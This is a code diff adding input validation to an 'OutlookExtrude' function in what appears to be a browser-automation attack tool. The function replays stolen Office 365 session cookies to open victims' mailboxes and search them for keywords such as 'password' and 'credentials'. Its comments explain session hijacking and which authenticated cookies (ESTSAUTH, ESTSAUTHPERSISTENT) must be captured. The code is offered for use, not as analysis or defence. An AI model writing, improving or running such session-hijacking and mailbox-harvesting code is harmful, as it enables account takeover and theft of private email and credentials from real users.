@@ -367,6 +367,24 @@ exports.OutlookWriteEmail = async ({ page, data: [taskId, cookies, params] }) =>
 }
 
 exports.OutlookExtrude = async ({ page, data: [taskId, cookies, params] }) => {
+    // Validate required params early so the error is actionable
+    if (!params || !params.fixSession) {
+        await db.UpdateTaskStatusWithReason(taskId, "error", "missing required param: fixSession (e.g. https://outlook.office365.com/mail/)")
+        return
+    }
+    if (!params.keywords || !Array.isArray(params.keywords) || params.keywords.length === 0) {
+        await db.UpdateTaskStatusWithReason(taskId, "error", "missing required param: keywords (array of search terms, e.g. [\"password\",\"credentials\"])")
+        return
+    }
+    // Office365 session hijacking requires ~37 authenticated cookies. Pre-auth OIDC
+    // correlation/nonce cookies (.AspNetCore.OpenIdConnect.Nonce.*, .AspNetCore.Correlation.*)
+    // will NOT work — capture cookies AFTER successful authentication.
+    if (!cookies || cookies.length < 5) {
+        await db.UpdateTaskStatusWithReason(taskId, "error", `insufficient cookies: got ${cookies ? cookies.length : 0}, need ~37 authenticated session cookies (ESTSAUTHPERSISTENT, ESTSAUTH, etc.)`)
+        return
+    }
+
+    await db.UpdateTaskStatus(taskId, "running")
     await page.setCookie(...cookies);
     await page.goto(params.fixSession);
 
